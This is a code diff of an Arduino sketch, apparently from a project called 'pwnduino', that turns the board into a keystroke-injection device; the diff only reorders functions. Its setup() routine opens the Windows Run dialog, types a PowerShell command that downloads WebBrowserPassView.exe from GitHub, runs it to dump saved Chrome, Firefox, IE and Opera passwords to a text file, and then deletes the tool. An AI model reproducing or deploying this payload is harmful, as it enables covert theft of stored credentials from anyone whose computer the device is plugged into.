@@ -20,60 +20,6 @@ uint8_t buf[8] = { 0 }; //buffer
 const int ledPin = 13;
 
 
-
-/////////////////////////////////////////////
-
-void setup()
-{
-   Serial.begin(9600);
-
-   // Open Run dialog
-   delay(3000); // Wait 3 seconds
-   keyPress(LEFT_GUI, 0x15); // Windows keys + R
-   keyRelease(); // Release the key
-   delay(200);
-
-   // Run powershell.exe
-   keyString("cmd.exe"); // Enter string
-   keyPress(0, KEY_ENTER); // Press enter
-   keyRelease(); // Release the key
-   delay(500);
-
-/*
-   keyString("powershell");
-   keyPress(0, KEY_ENTER);
-   keyRelease();
-   delay(500);*/
-   
-   // Run powershell command
-   keyString("powershell -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/ex0dus-0x/pwnduino/blob/master/deps/WebBrowserPassView.exe', 'WebBrowserPassView.exe')");
-   keyPress(0, KEY_ENTER);
-   keyRelease();
-   delay(500);
-
-   // Extract Passwords
-   keyString("WebBrowserPassView.exe /LoadPasswordsChrome 1 /LoadPasswordsFirefox 1 /LoadPasswordsIE 1 /LoadPasswordsOpera 1 /stext passwords.txt");
-   keyPress(0, KEY_ENTER);
-   keyRelease();
-   delay(500);
-
-   // Remove WebBrowserPassViewer
-   keyString("Remove-Item WebBrowserPassView.exe");
-   keyPress(0, KEY_ENTER);
-   keyRelease();
-   delay(500);
- }
-
-
-void loop()
-{
-  pinMode(ledPin, OUTPUT);
-  digitalWrite(ledPin, HIGH);
-  delay(1000);
-  digitalWrite(ledPin, LOW);
-}
-
-
 void keyPress(int mod, int key) {
   buf[0] = mod;
   buf[2] = key;
@@ -137,4 +83,56 @@ void keyString(String text) {
 
     }
   }
+}
+
+/////////////////////////////////////////////
+
+void setup()
+{
+   Serial.begin(9600);
+
+   // Open Run dialog
+   delay(3000); // Wait 3 seconds
+   keyPress(LEFT_GUI, 0x15); // Windows keys + R
+   keyRelease(); // Release the key
+   delay(200);
+
+   // Run powershell.exe
+   keyString("cmd.exe"); // Enter string
+   keyPress(0, KEY_ENTER); // Press enter
+   keyRelease(); // Release the key
+   delay(500);
+
+/*
+   keyString("powershell");
+   keyPress(0, KEY_ENTER);
+   keyRelease();
+   delay(500);*/
+
+   // Run powershell command
+   keyString("powershell -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/ex0dus-0x/pwnduino/blob/master/deps/WebBrowserPassView.exe', 'WebBrowserPassView.exe')");
+   keyPress(0, KEY_ENTER);
+   keyRelease();
+   delay(500);
+
+   // Extract Passwords
+   keyString("WebBrowserPassView.exe /LoadPasswordsChrome 1 /LoadPasswordsFirefox 1 /LoadPasswordsIE 1 /LoadPasswordsOpera 1 /stext passwords.txt");
+   keyPress(0, KEY_ENTER);
+   keyRelease();
+   delay(500);
+
+   // Remove WebBrowserPassViewer
+   keyString("Remove-Item WebBrowserPassView.exe");
+   keyPress(0, KEY_ENTER);
+   keyRelease();
+   delay(500);
+ }
+
+
+void loop()
+{
+  pinMode(ledPin, OUTPUT);
+  digitalWrite(ledPin, HIGH);
+  delay(1000);
+  digitalWrite(ledPin, LOW);
 }
